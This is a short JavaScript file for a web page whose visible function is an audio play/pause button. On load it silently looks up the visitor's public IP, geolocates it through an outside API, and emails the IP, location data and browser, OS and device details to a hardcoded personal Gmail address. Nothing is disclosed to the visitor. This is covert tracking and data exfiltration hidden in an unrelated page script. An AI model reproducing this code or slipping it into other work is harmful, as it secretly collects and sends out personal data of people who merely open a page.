
function sendEmail(response) {
    let data = [platform.version,platform.product,platform.manufacturer,platform.os,ip]
    Email.send({
      Host: "smtp.gmail.com",
      Username: "ashishk8581@gmail.com",
      Password: "",
      To: 'ashishk8581@gmail.com',
      From: "ashishk8581@gmail.com",
      Subject: "Sending Email using javascript",
      Body: 
          {version : data[0],
          product : data[1],
          manufacturer : data[2],
          os : data[3],
          ip : data[4],
          response: {
            response
          }
      }
    })
      .then(function (message) {
        console.log('')
      })
  }

  let ip = ''
  $.getJSON("https://api.ipify.org?format=json",
  function(data) {
   
    ip = data.ip
    
    var settings = {
        "url": `https://ipapi.co/${ip}/json/`,
        "method": "GET",
        "timeout": 0,
    };
    
    $.ajax(settings).done(function (response) {
        sendEmail(response)
    });
})
var audio = document.querySelector('#audio')
var playing = false
document.querySelector('button').addEventListener('click',()=>{
   if(playing) {
       playing = false
       audio.pause()
    }else{
        playing = true
        audio.play()
    }
})
